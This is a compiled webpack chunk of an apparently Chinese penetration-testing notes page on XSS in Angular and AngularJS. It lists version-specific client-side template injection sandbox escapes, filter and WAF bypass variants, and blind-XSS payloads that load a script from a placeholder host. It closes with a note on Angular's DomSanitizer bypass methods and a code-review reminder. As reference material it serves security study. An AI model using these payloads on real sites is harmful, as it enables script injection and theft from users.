"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[5839],{6811:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>o,contentTitle:()=>c,default:()=>p,frontMatter:()=>l,metadata:()=>t,toc:()=>i});const t=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/XSS\u6ce8\u5165/XSSInAngular","title":"Angular \u548c AngularJS \u4e2d\u7684 XSS","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/02.XSS\u6ce8\u5165/01.XSSInAngular.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/02.XSS\u6ce8\u5165","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/XSS\u6ce8\u5165/XSSInAngular","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/XSS\u6ce8\u5165/XSSInAngular","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/02.XSS\u6ce8\u5165/01.XSSInAngular.md","tags":[],"version":"current","sidebarPosition":1,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"XSS\u6ce8\u5165","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/XSS\u6ce8\u5165/"},"next":{"title":"\u5177\u6709\u76f8\u5bf9\u8def\u5f84\u8986\u76d6\u7684 XSS-IE 8/9 \u53ca\u66f4\u4f4e\u7248\u672c","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/XSS\u6ce8\u5165/XSSWithRelativePathOverwrite"}}');var a=r(4848),s=r(8453);const l={},c="Angular \u548c AngularJS \u4e2d\u7684 XSS",o={},i=[{value:"\u5ba2\u6237\u7aef\u6a21\u677f\u6ce8\u5165",id:"\u5ba2\u6237\u7aef\u6a21\u677f\u6ce8\u5165",level:2},{value:"\u5b58\u50a8/\u53cd\u5c04 XSS-AngularJS \u4e2d\u7684\u7b80\u5355\u8b66\u62a5",id:"\u5b58\u50a8\u53cd\u5c04-xss-angularjs-\u4e2d\u7684\u7b80\u5355\u8b66\u62a5",level:3},{value:"\u9ad8\u7ea7\u7ed5\u8fc7 XSS",id:"\u9ad8\u7ea7\u7ed5\u8fc7-xss",level:3},{value:"\u76f2 XSS",id:"\u76f2-xss",level:3},{value:"\u81ea\u52a8\u6d88\u6bd2",id:"\u81ea\u52a8\u6d88\u6bd2",level:2},{value:"\u53c2\u8003\u6587\u732e",id:"\u53c2\u8003\u6587\u732e",level:2}];function d(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,s.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"angular-\u548c-angularjs-\u4e2d\u7684-xss",children:"Angular \u548c AngularJS \u4e2d\u7684 XSS"})}),"\n",(0,a.jsxs)(n.table,{children:[(0,a.jsx)(n.thead,{children:(0,a.jsxs)(n.tr,{children:[(0,a.jsx)(n.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,a.jsx)(n.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,a.jsx)(n.tbody,{children:(0,a.jsxs)(n.tr,{children:[(0,a.jsx)(n.td,{style:{textAlign:"left"},children:(0,a.jsx)(n.img,{src:"https://img.shields.io/badge/wjlin0-blog-green",alt:"wjlin0"})}),(0,a.jsx)(n.td,{style:{textAlign:"left"},children:"2023-08-22 18:15:12"})]})})]}),"\n",(0,a.jsx)(n.h2,{id:"\u5ba2\u6237\u7aef\u6a21\u677f\u6ce8\u5165",children:"\u5ba2\u6237\u7aef\u6a21\u677f\u6ce8\u5165"}),"\n",(0,a.jsx)(n.p,{children:"\u4ee5\u4e0b\u6709\u6548\u8f7d\u8377\u57fa\u4e8e\u5ba2\u6237\u7aef\u6a21\u677f\u6ce8\u5165\u3002"}),"\n",(0,a.jsx)(n.h3,{id:"\u5b58\u50a8\u53cd\u5c04-xss-angularjs-\u4e2d\u7684\u7b80\u5355\u8b66\u62a5",children:"\u5b58\u50a8/\u53cd\u5c04 XSS-AngularJS \u4e2d\u7684\u7b80\u5355\u8b66\u62a5"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"AngularJS \u4ece 1.6 \u7248\u672c\u8d77\u5df2\u7ecf\u5b8c\u5168\u5220\u9664\u4e86\u6c99\u7bb1"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["AngularJS 1.6+by",(0,a.jsx)(n.a,{href:"https://twitter.com/cure53berlin",children:"\u9a6c\u91cc\u5965 \xb7 \u6d77\u5fb7\u91cc\u5e0c"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"constructor.constructor('alert(1)')()\n"})}),"\n",(0,a.jsxs)(n.p,{children:["AngularJS 1.6+by",(0,a.jsx)(n.a,{href:"https://twitter.com/brutelogic/status/1031534746084491265",children:"@ \u91ce\u86ee\u7684"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"[].pop.constructor&#40'alert\\u00281\\u0029'&#41&#40&#41\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u793a\u4f8b\u4f4d\u4e8e",(0,a.jsx)(n.a,{href:"https://brutelogic.com.br/xss.php?a=%3Cbrute+ng-app%3E%7B%7B%5B%5D.pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D",children:"https://brutelogic.com.br/xss.php"})]}),"\n",(0,a.jsxs)(n.p,{children:["AngularJS 1.6.0 \u4f5c\u8005\uff1a",(0,a.jsx)(n.a,{href:"https://twitter.com/LewisArdern/status/1055887619618471938",children:"@ \u5218\u6613\u65af-\u963f\u5fb7\u6069"}),"&",(0,a.jsx)(n.a,{href:"https://twitter.com/garethheyes/status/1055884215131213830",children:"@ \u52a0\u96f7\u745f\u8036\u65af"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"0[a='constructor'][a]('alert(1)')()\n$eval.constructor('alert(1)')()\n$on.constructor('alert(1)')()\n"})}),"\n",(0,a.jsxs)(n.p,{children:["AngularJS 1.5.9-1.5.11 \u4f5c\u8005",(0,a.jsx)(n.a,{href:"https://twitter.com/tehjh",children:"Jan Horn"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:" c=''.sub.call;b=''.sub.bind;a=''.sub.apply;\n    c.$apply=$apply;c.$eval=b;op=$root.$$phase;\n    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\n    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;\n    B=C(b,c,b);$evalAsync(\"\n    astNode=pop();astNode.type='UnaryExpression';\n    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';\n    astNode.argument={type:'Identifier',name:'foo'};\n    \");\n    m1=B($$asyncQueue.pop().expression,null,$root);\n    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n    $eval('a(b.c)');[].push.apply=a;\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u89d2\u5ea6 JS 1.5.0-1.5.8"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u89d2\u5ea6 JS 1.4.0-1.4.9"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5b89\u683c\u62c9 JS 1.3.20"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5b89\u683c\u62c9 JS 1.3.19"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;\n    $eval('x=alert(1)//');\n\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u89d2\u5ea6 JS 1.3.3-1.3.18"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n  'a'.constructor.prototype.charAt=[].join;\n  $eval('x=alert(1)//');  \n"})}),"\n",(0,a.jsx)(n.p,{children:"\u89d2\u5ea6 JS 1.3.1-1.3.2"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n    'a'.constructor.prototype.charAt=''.valueOf;\n    $eval('x=alert(1)//');\n\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5b89\u683c\u62c9 JS 1.3.0"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"!ready && (ready = true) && (\n      !call\n      ? $$watchers[0].get(toString.constructor.prototype)\n      : (a = apply) &&\n        (apply = constructor) &&\n        (valueOf = call) &&\n        (''+''.toString(\n          'F = Function.prototype;' +\n          'F.apply = F.a;' +\n          'delete F.a;' +\n          'delete F.valueOf;' +\n          'alert(1);'\n        ))\n    );\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u89d2\u5ea6 JS 1.2.24-1.2.29"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u89d2\u5ea6 JS 1.2.19-1.2.23"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:'toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u89d2\u5ea6 JS 1.2.6-1.2.18"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u89d2\u5ea6 JS 1.2.2-1.2.5"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u89d2\u5ea6 JS 1.2.0-1.2.1"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()\n"})}),"\n",(0,a.jsx)(n.p,{children:"AngularJS 1.0.1-1.1.5 \u548c Vue JS"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"constructor.constructor('alert(1)')()\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u9ad8\u7ea7\u7ed5\u8fc7-xss",children:"\u9ad8\u7ea7\u7ed5\u8fc7 XSS"}),"\n",(0,a.jsxs)(n.p,{children:["AngularJS\uff08\u4e0d\u5e26 ",(0,a.jsx)(n.code,{children:"'"})," \u5355\u5f15\u53f7\u548c ",(0,a.jsx)(n.code,{children:'"'})," \u53cc\u5f15\u53f7\uff09"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()\n"})}),"\n",(0,a.jsxs)(n.p,{children:["AngularJS\uff08\u4e0d\u5e26 ",(0,a.jsx)(n.code,{children:"'"})," \u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u4ee5\u53ca\u5b57\u7b26\u4e32\uff09"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()\n"})}),"\n",(0,a.jsx)(n.p,{children:"AngularJS \u65c1\u8def\u6676\u5706\u3014 Imperva \u3015"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\\\u{6f}mpt(d\\\\u{6f}cument.d\\\\u{6f}main)')()\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u76f2-xss",children:"\u76f2 XSS"}),"\n",(0,a.jsx)(n.p,{children:"1.0.1-1.1.5&&>1.6.0 \u9a6c\u91cc\u5965 \xb7 \u6d77\u5fb7\u91cc\u5e0c\uff08Cure53\uff09"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    constructor.constructor(\"var _ = document.createElement('script');\n    _.src='//localhost/m';\n    document.getElementsByTagName('body')[0].appendChild(_)\")()\n\n"})}),"\n",(0,a.jsx)(n.p,{children:"Lewis Ardern\uff08Synopsys\uff09\u548c Gareth Heyes\uff08PortSwigger\uff09\u7684\u66f4\u77ed\u7684 1.0.1-1.1.5&&>1.6.0"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    $on.constructor(\"var _ = document.createElement('script');\n    _.src='//localhost/m';\n    document.getElementsByTagName('body')[0].appendChild(_)\")()\n\n"})}),"\n",(0,a.jsx)(n.p,{children:"1.2.0-1.2.5 \u52a0\u96f7\u65af \xb7 \u6d77\u8036\u65af\uff08PortSwigger\uff09"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;\n    $eval('a\",eval(`var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\\x2eappendChild(_);`),\"')\n\n"})}),"\n",(0,a.jsx)(n.p,{children:"1.2.6-1.2.18 \u4f5c\u8005\uff1aJan Horn\uff08Cure53\uff0c\u73b0\u5c31\u804c\u4e8e Google Project Zero\uff09"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    (_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval(\"\n        var _ = document.createElement(\\'script\\');\n        _.src=\\'//localhost/m\\';\n        document.getElementsByTagName(\\'body\\')[0].appendChild(_)\")')()\n\n"})}),"\n",(0,a.jsx)(n.p,{children:"1.2.19\uff08\u706b\u72d0\uff09\u4f5c\u8005\uff1aMathias Karlsson"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    toString.constructor.prototype.toString=toString.constructor.prototype.call;\n    [\"a\",'eval(\"var _ = document.createElement(\\'script\\');\n    _.src=\\'//localhost/m\\';\n    document.getElementsByTagName(\\'body\\')[0].appendChild(_)\")'].sort(toString.constructor);\n\n"})}),"\n",(0,a.jsx)(n.p,{children:"1.2.20-1.2.29 \u4f5c\u8005\uff1aGareth Heyes\uff08PortSwigger\uff09"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;\n    $eval('a\",eval(`\n    var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\\x2eappendChild(_);`),\"')\n\n"})}),"\n",(0,a.jsx)(n.p,{children:"1.3.0-1.3.9 \u4f5c\u8005\uff1aGareth Heyes\uff08PortSwigger\uff09"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    a=toString().constructor.prototype;a.charAt=a.trim;\n    $eval('a,eval(`\n    var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\\x2eappendChild(_);`),a')\n\n"})}),"\n",(0,a.jsx)(n.p,{children:"1.4.0-1.5.8 \u4f5c\u8005\uff1a\u52a0\u96f7\u65af \xb7 \u6d77\u8036\u65af\uff08PortSwigger\uff09"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    a=toString().constructor.prototype;a.charAt=a.trim;\n    $eval('a,eval(`var _=document.createElement(\\'script\\');\n    _.src=\\'//localhost/m\\';document.body.appendChild(_);`),a')\n\n"})}),"\n",(0,a.jsx)(n.p,{children:"1.5.9-1.5.11 \u4f5c\u8005\uff1aJan Horn\uff08Cure53\uff0c\u73b0\u5c31\u804c\u4e8e Google Project Zero\uff09"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"\n    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;\n    c.$eval=b;op=$root.$$phase;\n    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\n    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;\n    B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\\\'script\\\\');_.src=\\\\'//localhost/m\\\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};\");\n    m1=B($$asyncQueue.pop().expression,null,$root);\n    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n    $eval('a(b.c)');[].push.apply=a;\n\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u81ea\u52a8\u6d88\u6bd2",children:"\u81ea\u52a8\u6d88\u6bd2"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u4e3a\u4e86\u7cfb\u7edf\u5730\u963b\u6b62 XSS \u9519\u8bef\uff0cAngular \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5c06\u6240\u6709\u503c\u89c6\u4e3a\u4e0d\u53ef\u4fe1\u3002\u5f53\u4e00\u4e2a\u503c\u901a\u8fc7\u5c5e\u6027\u3001\u5c5e\u6027\u3001\u6837\u5f0f\u3001\u7c7b\u7ed1\u5b9a\u6216\u63d2\u503c\u4ece\u6a21\u677f\u63d2\u5165 DOM \u65f6\uff0cAngular \u4f1a\u6e05\u9664\u548c\u8f6c\u4e49\u4e0d\u53d7\u4fe1\u4efb\u7684\u503c\u3002"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"\u4f46\u662f\uff0c\u53ef\u4ee5\u5c06\u503c\u6807\u8bb0\u4e3a\u53ef\u4fe1\uff0c\u5e76\u4f7f\u7528\u4ee5\u4e0b\u65b9\u6cd5\u963b\u6b62\u81ea\u52a8\u6e05\u9664\uff1a"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"bypassSecurityTrustHtml"}),"\n",(0,a.jsx)(n.li,{children:"bypassSecurityTrustScript"}),"\n",(0,a.jsx)(n.li,{children:"\u65c1\u8def\u5b89\u5168\u4fe1\u4efb\u6837\u5f0f"}),"\n",(0,a.jsx)(n.li,{children:"bypassSecurityTrustUrl"}),"\n",(0,a.jsx)(n.li,{children:"bypassSecurityTrustResourceUrl"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u4f7f\u7528\u4e0d\u5b89\u5168\u65b9\u6cd5\u7684\u7ec4\u4ef6\u793a\u4f8b ",(0,a.jsx)(n.code,{children:"bypassSecurityTrustUrl"}),"\uff1a"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:'import { Component, OnInit } from \'@angular/core\';\n\n@Component({\n  selector: \'my-app\',\n  template: `\n    <h4>An untrusted URL:</h4>\n    <p><a class="e2e-dangerous-url" [href]="dangerousUrl">Click me</a></p>\n    <h4>A trusted URL:</h4>\n    <p><a class="e2e-trusted-url" [href]="trustedUrl">Click me</a></p>\n  `,\n})\nexport class App {\n  constructor(private sanitizer: DomSanitizer) {\n    this.dangerousUrl = \'javascript:alert("Hi there")\';\n    this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);\n  }\n}\n'})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://angular.io/generated/images/guide/security/bypass-security-component.png",alt:"XSS"})}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u8fdb\u884c\u4ee3\u7801\u5ba1\u67e5\u65f6\uff0c\u60a8\u5e0c\u671b\u786e\u4fdd\u6ca1\u6709\u7528\u6237\u8f93\u5165\u662f\u53ef\u4fe1\u7684\uff0c\u56e0\u4e3a\u5b83\u4f1a\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5f15\u5165\u5b89\u5168\u6f0f\u6d1e\u3002"}),"\n",(0,a.jsx)(n.h2,{id:"\u53c2\u8003\u6587\u732e",children:"\u53c2\u8003\u6587\u732e"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:(0,a.jsx)(n.a,{href:"https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs",children:"\u4e0d\u5e26 HTML \u7684 XSS-\u5e26 Angular JS \u7684 CSTI-Portswigger"})}),"\n",(0,a.jsx)(n.li,{children:(0,a.jsx)(n.a,{href:"https://ardern.io/2018/12/07/angularjs-bxss",children:"\u76f2 XSS AngularJS \u6709\u6548\u8d1f\u8f7d"})}),"\n",(0,a.jsx)(n.li,{children:(0,a.jsx)(n.a,{href:"https://angular.io/guide/security",children:"\u89d2\u5ea6\u5b89\u5168\u6027"})}),"\n",(0,a.jsx)(n.li,{children:(0,a.jsx)(n.a,{href:"https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b",children:"\u7ed5\u8fc7 DomSanitizer"})}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>l,x:()=>c});var t=r(6540);const a={},s=t.createContext(a);function l(e){const n=t.useContext(s);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:l(e.components),t.createElement(s.Provider,{value:n},e.children)}}}]);